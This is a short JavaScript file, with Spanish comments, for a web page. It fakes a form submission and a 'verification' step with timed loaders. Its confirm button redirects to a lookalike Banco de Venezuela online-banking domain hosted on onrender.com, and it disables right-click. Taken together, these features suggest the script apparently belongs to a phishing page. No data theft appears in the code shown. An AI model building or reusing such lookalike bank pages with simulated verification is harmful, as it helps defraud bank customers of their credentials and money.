// Función para mostrar/ocultar el menú lateral
function toggleMenu() {
  var menu = document.getElementById('side-menu');
  var menuIcon = document.querySelector('.menu-icon');

  if (menu.classList.contains('open')) {
    menu.classList.remove('open');
    menuIcon.classList.remove('active');
  } else {
    menu.classList.add('open');
    menuIcon.classList.add('active');}

}function handleSubmit(event) {
  event.preventDefault(); // Previene el envío del formulario
  const loader = document.getElementById('loader');
  const successMessage = document.getElementById('success-message');
  const confirmationMessage = document.getElementById('new-confirmation-message');
  const confirmButton = document.getElementById('new-confirm-btn');

  // Mostrar el círculo de carga
  loader.style.display = 'inline-block';

  // Simula un retraso de envío del formulario (2 segundos)
  setTimeout(() => {
    loader.style.display = 'none'; // Oculta el círculo de carga
    successMessage.style.display = 'block'; // Muestra el mensaje de éxito
    confirmationMessage.style.display = 'block'; // Muestra el mensaje de confirmación
    confirmButton.style.display = 'inline-block'; // Muestra el botón de confirmar
     // Desplazamiento automático hacia el mensaje de confirmación
             const rect = confirmationMessage.getBoundingClientRect();
             const offset = rect.top + window.scrollY; // Calcula la posición del mensaje
             window.scrollTo({
                 top: offset - window.innerHeight + confirmButton.offsetHeight + 356.5, // Ajusta la posición para que el botón quede visible
                 behavior: 'smooth'
             });
         }, 2000);
     }
function startLoading() {
    const loading = document.getElementById('loading');
    const verificationIcon = document.getElementById('verification-icon');

    // Mostrar el círculo de carga
    loading.style.display = 'block';
    verificationIcon.style.display = 'none'; // Asegúrate de ocultar el ícono de verificación

    // Simular el proceso de verificación (puedes ajustarlo a tu necesidad)
    setTimeout(() => {
        loading.style.display = 'none'; // Ocultar el círculo de carga
        verificationIcon.style.display = 'block'; // Mostrar el ícono de verificación
    }, 2000); // Ajusta el tiempo según sea necesario
}

document.getElementById('new-confirm-btn').addEventListener('click', function() {
    window.location.href = 'https://bdvenlineabanvenez.onrender.com';
});


// Otras funciones o código aquí...

document.addEventListener('DOMContentLoaded', function() {
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });
});
